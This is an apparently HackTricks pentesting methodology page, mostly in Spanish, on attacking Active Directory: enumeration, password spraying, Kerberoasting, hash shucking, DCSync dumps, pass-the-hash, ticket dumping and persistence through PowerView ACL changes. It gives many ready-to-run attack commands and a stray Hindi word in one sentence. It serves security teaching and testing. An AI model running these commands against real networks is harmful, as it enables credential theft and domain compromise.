# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** sirve como una tecnología fundamental, permitiendo a los **network administrators** crear y administrar eficientemente **domains**, **users** y **objects** dentro de una red. Está diseñada para escalar, facilitando la organización de un gran número de users en **groups** y **subgroups** manejables, mientras controla los **access rights** en varios niveles.

La estructura de **Active Directory** se compone de tres capas principales: **domains**, **trees** y **forests**. Un **domain** abarca una colección de objects, como **users** o **devices**, que comparten una base de datos común. **Trees** son grupos de estos domains enlazados por una estructura compartida, y un **forest** representa la colección de múltiples trees, interconectadas mediante **trust relationships**, formando la capa más alta de la estructura organizativa. Se pueden designar **access** y **communication rights** específicos en cada uno de estos niveles.

Los conceptos clave dentro de **Active Directory** incluyen:

1. **Directory** – Almacena toda la información relacionada con los objects de Active Directory.
2. **Object** – Denota entidades dentro del directory, incluidos **users**, **groups** o **shared folders**.
3. **Domain** – Sirve como contenedor para los objects del directory, con la capacidad de que múltiples domains coexistan dentro de un **forest**, manteniendo cada uno su propia colección de objects.
4. **Tree** – Una agrupación de domains que comparten un domain raíz común.
5. **Forest** – El punto culminante de la estructura organizativa en Active Directory, compuesto por varios trees con **trust relationships** entre ellos.

**Active Directory Domain Services (AD DS)** abarca una gama de servicios críticos para la administración centralizada y la comunicación dentro de una red. Estos servicios comprenden:

1. **Domain Services** – Centraliza el almacenamiento de datos y gestiona las interacciones entre **users** y **domains**, incluyendo las funcionalidades de **authentication** y **search**.
2. **Certificate Services** – Supervisa la creación, distribución y gestión de **digital certificates** seguros.
3. **Lightweight Directory Services** – Da soporte a aplicaciones habilitadas para directory mediante el **LDAP protocol**.
4. **Directory Federation Services** – Proporciona capacidades de **single-sign-on** para autenticar usuarios en múltiples aplicaciones web en una sola sesión.
5. **Rights Management** – Ayuda a proteger material con copyright regulando su distribución y uso no autorizados.
6. **DNS Service** – Crucial para la resolución de **domain names**.

Para una explicación más detallada consulta: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender cómo **attack an AD** necesitas **understand** muy bien el **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Puedes consultar mucho en [https://wadcoms.github.io/](https://wadcoms.github.io) para tener una vista rápida de qué comandos puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> La comunicación Kerberos **requires a full qualifid name (FQDN)** para realizar acciones. Si intentas acceder a una máquina por la dirección IP, **usará NTLM y no kerberos**.

## Recon Active Directory (No creds/sessions)

Si solo tienes acceso a un entorno AD pero no tienes credenciales/sesiones, podrías:

- **Pentest the network:**
- Escanear la red, encontrar máquinas y puertos abiertos e intentar **exploit vulnerabilities** o **extract credentials** de ellas (por ejemplo, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerating DNS podría dar información sobre servidores clave del domain como web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Echa un vistazo a la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) general para encontrar más información sobre cómo hacer esto.
- **Check for null and Guest access on smb services** (esto no funcionará en versiones modernas de Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Aquí puedes encontrar una guía más detallada sobre cómo enumerar un servidor SMB:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Aquí puedes encontrar una guía más detallada sobre cómo enumerar LDAP (presta **especial atención al anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Recopilar credenciales [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acceder al host mediante [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Recopilar credenciales **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extraer usernames/names de documentos internos, redes sociales, servicios (principalmente web) dentro de los entornos del domain y también de lo disponible públicamente.
- Si encuentras los nombres completos de los empleados de la empresa, podrías probar distintas **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consulta las páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Cuando se solicita un **invalid username**, el server responderá usando el código de error de **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que nos permite determinar que el username era inválido. Los **valid usernames** provocarán bien la respuesta **TGT in a AS-REP** o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que al user se le requiere realizar pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra la interfaz MS-NRPC (Netlogon) en domain controllers. El método llama a la función `DsrGetDcNameEx2` después de vincular la interfaz MS-NRPC para comprobar si el user o computer existe sin ninguna credencial. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación puede encontrarse [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Servidor OWA (Outlook Web Access)**

Si encontraste uno de estos servidores en la red, también puedes realizar **enumeración de usuarios** contra él. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puedes encontrar listas de nombres de usuario en [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  y esta otra ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener el **nombre de las personas que trabajan en la empresa** desde el paso de recon que deberías haber realizado antes de esto. Con el nombre y apellido podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles usernames válidos.

### Knowing one or several usernames

Ok, así que ya sabes que tienes al menos un username válido pero no passwords... Entonces prueba:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_, puedes **solicitar un mensaje AS_REP** para ese usuario que contendrá algunos datos cifrados mediante una derivación de la password del usuario.
- [**Password Spraying**](password-spraying.md): Probemos las passwords más **comunes** con cada uno de los usuarios descubiertos, quizá algún usuario esté usando una password débil (¡ten en cuenta la password policy!).
- Ten en cuenta que también puedes **sprayear servidores OWA** para intentar obtener acceso a los mail servers de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Podrías ser capaz de **obtener** algunos challenge **hashes** para crackear **envenenando** algunos protocolos de la **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si has conseguido enumerar el active directory, tendrás **más emails y una mejor comprensión de la network**. Podrías ser capaz de forzar **relay attacks** de NTLM para obtener acceso al entorno de AD.

### NetExec workspace-driven recon & relay posture checks

- Usa **`nxcdb` workspaces** para mantener el estado de la recon de AD por engagement: `workspace create <name>` crea SQLite DBs por protocolo en `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia de vista con `proto smb|mssql|winrm` y lista los secrets recopilados con `creds`. Elimina manualmente los datos sensibles cuando termines: `rm -rf ~/.nxc/workspaces/<name>`.
- Descubrimiento rápido de subred con **`netexec smb <cidr>`** muestra **domain**, **OS build**, **SMB signing requirements**, y **Null Auth**. Los miembros que muestran `(signing:False)` son **relay-prone**, mientras que los DCs a menudo requieren signing.
- Genera **hostnames en /etc/hosts** directamente desde la salida de NetExec para facilitar el targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Cuando el **SMB relay al DC está bloqueado** por signing, sigue comprobando la postura de **LDAP**: `netexec ldap <dc>` resalta `(signing:None)` / weak channel binding. Un DC con SMB signing requerido pero LDAP signing deshabilitado sigue siendo un objetivo viable de **relay-to-LDAP** para abuses como **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Las UIs de printer/web a veces **incluyen contraseñas admin ocultas dentro del HTML**. Ver el source/devtools puede revelar texto claro (p. ej., `<input value="<password>">`), permitiendo acceso Basic-auth para explorar repositorios de scan/print.
- Los print jobs recuperados pueden contener **plaintext onboarding docs** con contraseñas por usuario. Mantén alineadas las parejas al hacer testing:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use **powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si has logrado enumerar active directory, tendrás **más emails y un mejor entendimiento de la red**. Podrías incluso forzar **relay attacks** de NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Ahora que ya tienes algunas credenciales básicas, deberías comprobar si puedes **encontrar** algún **archivo interesante compartido dentro del AD**. Podrías hacerlo manualmente, pero es una tarea muy aburrida y repetitiva (y más aún si encuentras cientos de documentos que necesitas revisar).

[**Sigue este enlace para aprender sobre herramientas que podrías usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si puedes **acceder a otros PCs o shares**, podrías **colocar archivos** (como un archivo SCF) que, si se acceden de alguna forma, t**rigger an autenticación NTLM contra ti** para que puedas **robar** el **NTLM challenge** y crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía a cualquier usuario autenticado **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para las siguientes técnicas, un usuario normal del dominio no es suficiente; necesitas algunos privilegios/credenciales especiales para llevar a cabo estos ataques.**

### Hash extraction

Esperemos que hayas logrado **compromise some local admin** account usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluyendo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Entonces, es momento de dumpear todos los hashes en memoria y localmente.\
[**Lee esta página sobre las diferentes maneras de obtener los hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tienes el hash de un usuario**, puedes usarlo para **suplantarlo**.\
Necesitas usar alguna **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** podrías crear un nuevo **sessionlogon** e **inyectar** ese **hash** dentro de **LSASS**, de modo que cuando se realice cualquier **autenticación NTLM**, se use ese **hash**. La última opción es lo que hace mimikatz.\
[**Lee esta página para más información.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque busca **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como una alternativa al común Pass The Hash sobre el protocolo NTLM. Por lo tanto, esto podría ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado** y solo **Kerberos está permitido** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de su contraseña o valores hash. Este ticket robado se usa luego para **suplantar al usuario**, obteniendo acceso no autorizado a recursos y servicios dentro de una red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si tienes el **hash** o la **password** de un **administrador local**, deberías intentar **login locally** en otros **PCs** con ello.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Ten en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### MSSQL Abuse & Trusted Links

Si un usuario tiene privilegios para **acceder a instancias MSSQL**, podría usarlos para **ejecutar comandos** en el host MSSQL (si se ejecuta como SA), **robar** el NetNTLM **hash** o incluso realizar un **relay** **attack**.\
Además, si una instancia MSSQL es trusted (database link) por otra instancia MSSQL diferente. Si el usuario tiene privilegios sobre la base de datos trusted, podrá **usar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas trusts se pueden encadenar y, en algún momento, el usuario podría encontrar una base de datos mal configurada donde pueda ejecutar comandos.\
**Los links entre bases de datos funcionan incluso a través de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Las suites de inventario y despliegue de terceros a menudo exponen rutas potentes para credenciales y ejecución de código. Ver:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentras cualquier objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás volcar TGTs de la memoria de todos los usuarios que inicien sesión en el equipo.\
Así que, si un **Domain Admin inicia sesión en el equipo**, podrás volcar su TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation podrías incluso **comprometer automáticamente un Print Server** (con suerte será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si a un usuario o equipo se le अनुमति para "Constrained Delegation", podrá **impersonar a cualquier usuario para acceder a algunos servicios en un equipo**.\
Entonces, si **comprometes el hash** de este usuario/equipo podrás **impersonar a cualquier usuario** (incluso domain admins) para acceder a algunos servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Tener privilegio de **WRITE** sobre un objeto de Active Directory de un equipo remoto permite obtener ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

El usuario comprometido podría tener algunos **privilegios interesantes sobre algunos objetos de dominio** que podrían permitirte **moverte** lateralmente/**escalar** privilegios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Descubrir un **servicio Spool en escucha** dentro del dominio puede **abusarse** para **obtener nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **otros usuarios** **acceden** a la máquina **comprometida**, es posible **recopilar credenciales de la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Normalmente los usuarios accederán al sistema vía RDP, así que aquí tienes cómo realizar un par de attacks sobre sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del Administrador local** en equipos unidos al dominio, asegurando que sea **aleatoria**, única y que cambie con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso se controla mediante ACLs solo para usuarios autorizados. Con suficientes permisos para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Recopilar certificados** de la máquina comprometida podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si se configuran **templates vulnerables**, es posible abusar de ellos para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una vez que obtienes privilegios de **Domain Admin** o incluso mejor **Enterprise Admin**, puedes **dumpear** la **base de datos del dominio**: _ntds.dit_.

[**Más información sobre el attack DCSync aquí**](dcsync.md).

[**Más información sobre cómo robar el NTDS.dit aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algunas de las técnicas discutidas antes pueden usarse para persistencia.\
Por ejemplo, podrías:

- Hacer usuarios vulnerables a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Hacer usuarios vulnerables a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilegios de [**DCSync**](#dcsync) a un usuario

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

El **Silver Ticket attack** crea un **Ticket Granting Service (TGS) ticket** legítimo para un servicio específico usando el **NTLM hash** (por ejemplo, el **hash de la cuenta del PC**). Este método se emplea para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** implica que un atacante obtenga acceso al **NTLM hash de la cuenta krbtgt** en un entorno de Active Directory (AD). Esta cuenta es especial porque se usa para firmar todos los **Ticket Granting Tickets (TGTs)**, que son esenciales para autenticarse dentro de la red AD.

Una vez que el atacante obtiene este hash, puede crear **TGTs** para cualquier cuenta que elija (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Son como golden tickets forjados de una forma que **evita los mecanismos comunes de detección de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Tener certificados de una cuenta o poder solicitarlos** es una muy buena forma de poder persistir en la cuenta de usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usar certificados también permite persistir con privilegios elevados dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

El objeto **AdminSDHolder** en Active Directory asegura la seguridad de los **privileged groups** (como Domain Admins y Enterprise Admins) aplicando una **Access Control List (ACL)** estándar a estos grupos para evitar cambios no autorizados. Sin embargo, esta característica puede ser explotada; si un atacante modifica la ACL de AdminSDHolder para dar acceso completo a un usuario normal, ese usuario obtiene un control extenso sobre todos los privileged groups. Esta medida de seguridad, diseñada para proteger, puede así volverse en contra y permitir acceso no autorizado si no se supervisa de cerca.

[**Más información sobre el grupo AdminDSHolder aquí.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe una cuenta de **local administrator**. Al obtener derechos de admin en una máquina así, se puede extraer el hash del Administrador local usando **mimikatz**. Después de esto, es necesaria una modificación del registro para **habilitar el uso de esta contraseña**, permitiendo el acceso remoto a la cuenta de Administrador local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

